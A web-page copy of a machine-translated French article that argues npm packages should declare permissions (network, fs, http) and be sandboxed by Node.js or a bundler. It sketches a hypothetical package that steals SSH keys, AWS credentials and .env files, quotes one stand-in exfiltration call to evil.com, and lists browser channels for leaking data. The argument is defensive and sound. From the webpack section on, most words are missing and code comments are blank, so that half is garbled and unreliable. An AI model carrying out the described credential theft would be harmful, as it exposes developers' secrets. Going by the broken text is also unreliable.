<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤡 📵 👩🏿‍🎓 Avoir une idée: système d'autorisation pour les packages npm 👇🏿 👩🏾‍🤝‍👩🏼 🏤</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Il y a quelques jours, j'ai d'abord lancé la calculatrice sur un nouveau téléphone et j'ai vu ce message: "La calculatrice aimerait accéder à vos cont...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Avoir une idée: système d'autorisation pour les packages npm</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Il y a quelques jours, j'ai d'abord lancé la calculatrice sur un nouveau téléphone et j'ai vu ce message: "La calculatrice aimerait accéder à vos contacts." <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  Au début, ce message me semblait un peu triste (il semblait que la calculatrice était seule), mais ce cas m'a fait réfléchir ... <br><a name="habracut"></a><br>  Et si, comme les applications téléphoniques, les packages npm devaient déclarer les autorisations nécessaires à leur travail?  Avec cette approche, le fichier de package <code>package.json</code> pourrait ressembler à ceci: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  Sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">npmjs.com, une</a> section de la page du package contenant des informations sur les autorisations dont il a besoin pourrait ressembler à ceci. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Une telle section d'autorisation peut être disponible pour les packages sur le site de registre npm.</i> <br>  Ces listes d'autorisations pour un package peuvent être une combinaison des autorisations de toutes ses dépendances avec ses propres autorisations. <br><br>  Un coup d'œil au contenu de la section des <code>permissions</code> du package <code>fancy-logger</code> peut amener le développeur à se demander pourquoi le package qui écrit quelque chose sur la console doit accéder au module <code>http</code> et que cela semble quelque peu suspect. <br><br>  Quel serait le monde dans lequel un système d'autorisation similaire pour les packages npm serait utilisé?  Peut-être que quelqu'un ne verra pas l'intérêt de cela, car il se sent complètement en sécurité, par exemple, en utilisant uniquement des packages fiables d'éditeurs éprouvés.  Pour que tous ceux qui lisent ceci se sentent vulnérables, voici une courte histoire. <br><br><h2>  <font color="#3AC1EF">L'histoire de la façon dont je vole vos variables d'environnement</font> </h2><br>  Je voulais créer un package npm appelé <code>space-invaders</code> .  C'était intéressant d'apprendre à créer des jeux en écrivant un jeu qui fonctionne dans la console, et en même temps de justifier mon point de vue sur les vulnérabilités liées aux packages npm. <br><br>  Vous pouvez exécuter ce jeu avec cette commande: <code>npx space-invaders</code> .  Après son lancement, on pouvait immédiatement commencer à tirer sur les extraterrestres et tuer le temps. <br><br>  Vous aimeriez ce jeu, vous le partageriez avec des amis, ils aimeraient aussi. <br><br>  Tout cela semble très positif, mais, vous divertissant, les <code>space-invaders</code> jeu feront leur propre <code>space-invaders</code> , à savoir la collecte de certaines données.  Il collectera des informations à partir de <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , de <code>~/.bash_profile</code> et d'autres endroits similaires, lira le contenu de tous les fichiers <code>.env</code> qu'il peut atteindre, y compris <code>process.env</code> , regardez à la configuration git (afin de savoir à qui il recueille les informations), puis elle envoie tout cela à mon serveur. <br><br>  Je n'ai pas écrit un tel jeu, mais depuis un certain temps je me sens mal à l'aise, et quand <code>npm install</code> commande <code>npm install</code> , je pense à la vulnérabilité de mon système.  Maintenant, en regardant l'indicateur de progression de l'installation, je pense au nombre de dossiers et de fichiers standard sur mon ordinateur portable dont le contenu ne doit pas tomber entre de mauvaises mains. <br><br>  Et ce n'est pas seulement mon espace de travail.  Par exemple, je ne sais même pas s'il existe des données dans certaines variables d'environnement de mon système d'assemblage de site pour la connexion à la base de données du serveur de production.  S'il y a quelque part de telles données, alors vous pouvez imaginer une situation dans laquelle un paquet npm malveillant installe un script dans le système conçu pour se connecter à ma base de données de travail.  Ensuite, ce script exécute la commande <code>SELECT * from users</code> , puis <code>http.get('http://evil.com/that-data')</code> .  Peut-être était-ce précisément en raison de la possibilité de telles attaques que j'ai rencontré des conseils selon lesquels les mots de passe ne devraient pas être stockés dans des bases de données en texte brut? <br><br>  Tout cela semble assez effrayant, et cela se produit probablement déjà (bien qu'il soit impossible de dire exactement si cela se produit ou non). <br><br>  Avec cela, peut-être, nous cesserons de parler des conséquences du vol de données importantes.  Revenons au sujet des autorisations pour les packages npm. <br><br><h2>  <font color="#3AC1EF">Modifications des autorisations de verrouillage</font> </h2><br>  Je suppose que ce serait génial de pouvoir voir les autorisations nécessaires au package lors de la visualisation du site npm.  Mais il convient de noter que la possibilité de voir les autorisations n'est bonne que lorsqu'elle est appliquée à un moment précis, en fait, cela ne résout pas le vrai problème. <br><br>  Lors d'un incident récent dans npm, quelqu'un a d'abord publié une version de correctif d'un package contenant du code malveillant, puis a publié une version mineure dont le code malveillant avait déjà été supprimé.  Le temps entre ces deux événements a été suffisant pour mettre en danger de nombreux utilisateurs du colis dangereux. <br><br>  Voilà le problème.  Pas des packages créés par des logiciels malveillants et qui le restent tout le temps.  Le problème est que, dans un package apparemment fiable, vous pouvez tranquillement ajouter quelque chose de mauvais et après un certain temps l'enlever. <br><br>  En conséquence, nous pouvons dire que nous avons besoin d'un mécanisme pour bloquer l'ensemble des autorisations reçues par les packages. <br><br>  Ce sera peut-être quelque chose comme un fichier <code>package-permissions.json</code> qui définit les autorisations pour Node.js et pour le navigateur et contient une liste de packages qui ont besoin de ces autorisations.  Avec cette approche, il serait nécessaire de répertorier tous les packages dans un tel fichier, et pas seulement ceux qui se trouvent dans la section des <code>dependencies</code> du fichier <code>package.json</code> du projet. <br><br>  Voici à quoi pourrait ressembler le fichier <code>package-permissions.json</code> . <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Une version réelle d'un tel fichier pourrait contenir beaucoup plus d'entrées de package. <br><br>  Imaginez maintenant qu'un jour vous mettiez à jour un package avec deux cents dépendances qui seront également mises à jour.  Une version de correctif a été publiée pour l'une de ces dépendances, qui nécessitait soudainement un accès au <code>http</code> Node.js. <br><br>  Si cela se produit, la commande <code>npm install</code> échouera avec un message semblable au suivant: «Le package <code>add-two-number</code> requis par le package <code>fancy-logger</code> demandé l'accès au <code>http</code> Node.js.  Exécutez la commande <code>npm update-permissions add-two-numbers</code> pour résoudre ce problème, puis réexécutez la commande <code>npm install</code> . » <br><br>  Ici, <code>fancy-logger</code> est le package qui se trouve dans votre fichier <code>package.json</code> (en supposant que vous êtes familier avec ce package), et le package <code>add-two-numbers</code> est une dépendance de <code>fancy-logger</code> dont vous n'avez jamais entendu parler. <br><br>  Bien sûr, même s'il existe un fichier dans le système pour «bloquer» les dépendances, certains développeurs confirmeront les nouvelles autorisations sans penser à rien.  Mais, au minimum, un changement dans <code>package-permissions.json</code> sera visible dans la demande de tirage, c'est-à-dire qu'il y aura une chance qu'un autre développeur plus responsable y prête attention. <br><br>  En outre, les modifications des autorisations demandées nécessiteraient que le registre npm lui-même avertisse les auteurs de packages lorsqu'une situation change quelque part dans l'arborescence de dépendances de leurs packages.  Peut-être - cela se fera par e-mail avec le contenu suivant: <br><br>  "Bonjour, auteur de <code>fancy-logger</code> .  Nous vous informons que <code>add-two-number</code> , le package dont vous utilisez les capacités, a demandé l'autorisation de travailler avec le module <code>http</code> .  Vos autorisations de package, comme indiqué sur <code>npmjs.com/package/fancy-logger</code> , ont été mises à jour en conséquence. » <br><br>  Bien sûr, cela ajoutera au travail des auteurs des packages et de npm lui-même, mais ces choses mériteront d'y passer un peu de temps.  Dans ce cas, l'auteur de l' <code>add-two-numbers</code> peut être absolument sûr que s'il demande l'autorisation de travailler avec le module <code>http</code> , cela entraînera le déclenchement de nombreuses "alarmes" dans le monde. <br><br>  Voilà ce dont nous avons besoin.  Hein?  J'aimerais espérer que, comme dans le cas des applications téléphoniques, et même dans le cas des extensions pour Chrome, les packages qui nécessitent moins d'autorisations seront plus populaires auprès des utilisateurs que ceux qui ont besoin d'un niveau d'accès inexplicablement élevé aux systèmes.  Ceci, à son tour, fera très bien réfléchir les auteurs de packages lors du choix des autorisations requises pour leur développement. <br><br>  Supposons que npm décide d'introduire un système d'autorisation.  Le premier jour du lancement d'un tel système, tous les packages seront considérés comme nécessitant des autorisations complètes (une telle décision sera prise plus tard - dans les cas où la section des <code>permissions</code> est manquante dans <code>package.json</code> ). <br><br>  L'auteur du package, qui souhaite affirmer que son package ne nécessite pas d'autorisations spéciales, sera intéressé par l'ajout de la section des <code>permissions</code> dans <code>package.json</code> tant qu'objet vide.  Et, si les auteurs des packages sont suffisamment intéressés pour que les autorisations de dépendance ne «surchargent» pas leurs packages, ils essaieront de s'assurer que ces packages de dépendance ne nécessitent pas non plus d'autorisations spéciales, par exemple, en effectuant des requêtes d'extraction appropriées dans le référentiel de dépendances. <br><br>  De plus, chaque auteur du package s'efforcera de réduire le risque de vulnérabilité de son package lors de la rupture de l'une de ses dépendances.  Par conséquent, si les auteurs des packages utilisent des dépendances qui nécessitent des autorisations qui, semble-t-il, ne sont pas nécessaires, ils seront incités à passer à l'utilisation d'autres packages. <br><br>  Et dans le cas des développeurs qui utilisent des packages npm lors de la création d'applications, cela les obligera à porter une attention particulière aux packages utilisés dans leurs projets, en choisissant principalement ceux qui ne nécessitent pas d'autorisations spéciales.  Dans le même temps, bien sûr, certains packages, pour des raisons objectives, nécessiteront des autorisations qui peuvent causer des problèmes, mais ces packages sont susceptibles d'être sous le contrôle spécial des développeurs. <br><br>  Peut-être que quelque chose comme <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Greenkeeper</a> peut aider d'une manière ou d'une autre à résoudre tous ces problèmes. <br><br>  Enfin, le fichier <code>package-permissions.json</code> fournira un résumé facile à comprendre pour un professionnel de la sécurité qui évalue les «trous» potentiels dans une application et vous permet de poser des questions spécifiques sur les packages controversés et leurs autorisations. <br><br>  En conséquence, j'espère que cette simple propriété d' <code>permissions</code> pourra se répandre assez largement parmi environ 800 000 packages npm et rendre npm plus sûr. <br><br>  Bien sûr, cela n'empêchera pas d'éventuelles attaques.  Tout comme les autorisations demandées par les applications mobiles ne rendent pas impossible la création d'applications mobiles malveillantes distribuées sur les sites officiels.  Mais cela réduira la «surface d'attaque» aux packages qui demandent explicitement la permission d'effectuer certaines actions qui pourraient constituer une menace pour les systèmes informatiques.  De plus, il sera intéressant de savoir quel pourcentage de packages ne nécessite aucune autorisation spéciale. <br><br>  Voici à quoi ressemble le mécanisme de travail avec les autorisations pour les packages npm.  Si cette idée devient réalité, nous pouvons soit compter sur le fait que les attaquants décriront honnêtement leurs packages en déclarant des autorisations, soit combiner le système de déclaration d'autorisations avec le mécanisme de restriction forcée des capacités des packages en fonction des autorisations demandées par eux.  C'est une question intéressante.  Voyons cela comme appliqué à Node.js et aux navigateurs. <br><br><h2>  <font color="#3AC1EF">Forcer les restrictions de package en fonction des autorisations demandées par eux dans Node.js</font> </h2><br>  Ici, je vois deux options possibles pour appliquer de telles restrictions. <br><br><h3>  <font color="#3AC1EF">▍ Option 1: package npm spécial forçant des mesures de sécurité</font> </h3><br>  Imaginez un package créé et maintenu par npm (ou une autre organisation faisant également autorité et visionnaire).  Laissez ce paquet s'appeler <code>@npm/permissions</code> . <br><br>  Un tel package serait soit inclus dans le code d'application avec la première commande d'importation, soit les applications seraient lancées avec une commande de la forme <code>node -r @npm/permissions index.js</code> . <br><br>  Un package remplacerait les autres commandes d'importation afin de ne pas violer les autorisations indiquées dans la section <code>permissions</code> des fichiers <code>package.json</code> des autres packages.  Si l'auteur d'un certain package <code>lovely-logger</code> n'a pas déclaré la nécessité de ce package dans le module <code>http</code> Node.js, cela signifie qu'un tel package n'est pas accessible par ce module. <br><br>  À strictement parler, le blocage de modules Node.js entiers de cette façon n'est pas idéal.  Par exemple, le package de <code>methods</code> npm charge le module <code>http</code> Node.js, mais n'envoie aucune donnée à l'aide de celui-ci.  Il prend simplement l'objet <code>http.METHODS</code> , convertit son nom en <code>http.METHODS</code> et l'exporte en tant que package npm classique.  Maintenant, un tel package ressemble à une excellente cible pour un attaquant - il a 6 millions de téléchargements par semaine, alors qu'il n'a pas changé depuis 3 ans.  Je pourrais écrire aux auteurs de ce paquet et les inviter à me donner son référentiel. <br><br>  Compte tenu du package de <code>methods</code> , il serait préférable de considérer qu'il ne nécessite pas d'autorisation <code>network</code> , et pas d'autorisation qui donne accès au module <code>http</code> .  Ensuite, cette restriction peut être corrigée à l'aide d'un mécanisme externe et neutraliser toute tentative de ce package d'envoyer certaines données à partir des systèmes dans lesquels il fonctionne. <br><br>  Le package imaginaire <code>@npm/permissions</code> pourrait également restreindre l'accès d'un package à tout autre package qui n'était pas répertorié comme ses dépendances.  Cela empêchera le package, par exemple, d'importer quelque chose comme <code>fs-extra</code> et <code>request</code> , et utilisera les capacités de ces packages pour lire les données du système de fichiers et envoyer des données lues à un attaquant. <br><br>  De même, il peut être utile de faire la distinction entre l'accès au disque «interne» et «externe».  Je suis très heureux que le <code>node-sass</code> besoin d'accéder aux matériaux situés dans le répertoire de mon projet, mais je ne vois aucune raison pour que ce package ait besoin d'accéder à quoi que ce soit en dehors de ce répertoire. <br><br>  Peut-être qu'au tout début de l'introduction du système d'autorisation, le package <code>@npm/permissions</code> devra être ajouté aux projets manuellement.  Peut-être, pendant la période de transition, pendant l'élimination des dysfonctionnements inévitables, c'est la seule approche raisonnable pour utiliser un tel mécanisme.  Mais pour assurer une réelle sécurité, il est nécessaire que ce package soit étroitement intégré au système, car il sera nécessaire de prendre en compte les autorisations lors de l'exécution des scripts d'installation du package. <br><br>  Ensuite, très probablement, il s'avère qu'une simple commande de la forme <code>"enforcePermissions": true</code> dans le fichier <code>package.json</code> du projet dira à npm d'exécuter tous les scripts avec l'utilisation forcée des autorisations déclarées par eux. <br><br><h3>  <font color="#3AC1EF">▍ Option 2: Node.js en mode sans échec</font> </h3><br>  Le mode de fonctionnement spécial de Node.js, axé sur un niveau de sécurité accru, nécessitera évidemment des modifications plus sérieuses.  Mais peut-être qu'à long terme, la plateforme Node.js elle-même pourra appliquer les restrictions définies par les autorisations déclarées par chaque package. <br><br>  D'une part, je sais que ceux qui développent la plateforme Node.js s'efforcent de résoudre les problèmes de cette plateforme, et mes idées sur la sécurité des packages npm dépassent le cadre de leurs intérêts.  Après tout, au final, npm n'est que la technologie qui accompagne Node.js.  D'un autre côté, les développeurs de Node.js souhaitent que les utilisateurs en entreprise se sentent en confiance en travaillant avec cette plate-forme, et la sécurité, probablement, est l'un de ces aspects de Node.js qui ne devrait pas être laissé à la «communauté». <br><br>  Donc, pour l'instant, tout ce dont nous avons parlé semblait assez simple et se résumait à garantir que le système d'une manière ou d'une autre surveillerait les capacités utilisées par les modules pendant le fonctionnement de Node.js. <br><br>  Parlons maintenant des navigateurs.  Tout ici n'a pas l'air si clair et compréhensible du tout. <br><br><h2>  <font color="#3AC1EF">Restriction forcée des capacités des packages conformément aux autorisations demandées dans les navigateurs</font> </h2><br>  À première vue, la restriction forcée des capacités des packages dans les navigateurs semble encore plus facile, car le code qui s'exécute dans le navigateur ne peut pas faire grand-chose par rapport au système d'exploitation sur lequel le navigateur est basé.  En fait, dans le cas des navigateurs, vous n'avez qu'à vous soucier de la capacité des paquets à transférer des données vers des adresses inhabituelles. <br><br>  Le problème ici est qu'il existe d'innombrables façons d'envoyer des données du navigateur de l'utilisateur au serveur de l'attaquant. <br><br>  C'est ce qu'on appelle une exfiltration ou une fuite de données, et si vous demandez à un professionnel de la sécurité comment éviter cela, lui, avec l'apparence de la personne qui a inventé la poudre à canon, vous dira d'arrêter d'utiliser npm. <br><br>  Je crois que pour les packages fonctionnant dans les navigateurs, vous devez faire attention à une seule résolution - celle qui est responsable de la capacité de travailler avec le réseau.  Appelons cela un <code>network</code> .  Il peut y avoir d'autres autorisations dans cet environnement (telles que celles qui régulent l'accès au DOM ou au stockage local), mais ici je pars de l'hypothèse que notre principale préoccupation est la possibilité de fuite de données. <br><br>  Les données du navigateur peuvent être «supprimées» de plusieurs façons.  Voici ceux dont je me souvenais en 60 secondes: <br><br><ul><li>  <code>fetch</code> API. </li><li>  Sockets Web </li><li>  Technologie WebRTC. </li><li>  Constructeur d' <code>EventSource</code> . </li><li>  API <code>XMLHttpRequest</code> </li><li>  Définition de la propriété <code>innerHTML</code> de divers éléments (vous pouvez créer de nouveaux éléments). </li><li>  Création d'un objet image avec la <code>new Image()</code> commande <code>new Image()</code> (la propriété <code>src</code> d'une image peut servir de moyen d'exfiltration de données). </li><li>  Définition de <code>document.location</code> , <code>window.location</code> , etc. </li><li>  Modification des propriétés <code>src</code> d'une image existante, <code>iframe</code> ou quelque chose comme ça. </li><li>  Modifications de la propriété <code>target</code> de l'élément <code>&lt;form&gt;</code> . </li><li>  Utiliser une chaîne intelligemment conçue pour accéder à l'un des mécanismes ci-dessus ou pour accéder à quelque chose en <code>top</code> ou en <code>self</code> au lieu de <code>windows</code> . </li></ul><br>  Il convient de noter qu'une bonne politique de sécurité du contenu (CSP) est capable de neutraliser certaines de ces menaces, mais cela ne s'applique pas à toutes.  Si quelqu'un peut me corriger, je serai heureux, mais je crois que vous ne pouvez jamais compter sur le fait que CSP vous protégera complètement contre les fuites de données.  Une personne m'a dit un jour que le CSP offre une protection presque complète contre un grand nombre de menaces.  À cela, j'ai répondu que vous ne pouvez pas être un peu enceinte, et depuis lors, nous n'avons pas communiqué avec cette personne. <br><br>  Si vous abordez judicieusement la recherche de moyens de voler des données du navigateur, je suis sûr qu'il est assez réaliste de dresser une liste assez complète de ces méthodes. <br><br>  Maintenant, nous devons trouver un mécanisme pour refuser l'accès à l'utilisation des opportunités à partir d'une liste similaire. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> —  ,    .  «»      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         —    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  «»     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  «»   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  C'est compréhensible. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    « ...»,     ,   ,       ? <br><br><h2>  <font color="#3AC1EF">Résumé</font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% — ,    . <br><br> ,          ,           -  . <br><br>  <b>Chers lecteurs!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr433010/">https://habr.com/ru/post/fr433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr432998/index.html">Histoire de Noël</a></li>
<li><a href="../fr433000/index.html">Compilation de Kotlin: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../fr433002/index.html">Venez vous-même ... ou les règles de la communication en équipe</a></li>
<li><a href="../fr433004/index.html">Une stratégie de migration cloud robuste pour 2019: 7 conseils</a></li>
<li><a href="../fr433008/index.html">Les périphériques USB constituent une menace «soudaine»</a></li>
<li><a href="../fr433012/index.html">Peut-être que je ne suis en vie qu'à cause d'elle: pourquoi les patients souffrant d'apnée s'appuient-ils sur un programme écrit par un pirate</a></li>
<li><a href="../fr433014/index.html">Blagues sur la récente libération d'astronautes dans l'espace</a></li>
<li><a href="../fr433016/index.html">Changements d'interface, animation en couches et chaos visuel structuré: un examen des tendances Web pour 2019</a></li>
<li><a href="../fr433018/index.html">UDB. Qu'est-ce que c'est? Partie 2. Chemin de données</a></li>
<li><a href="../fr433030/index.html">Live: performances frontales</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>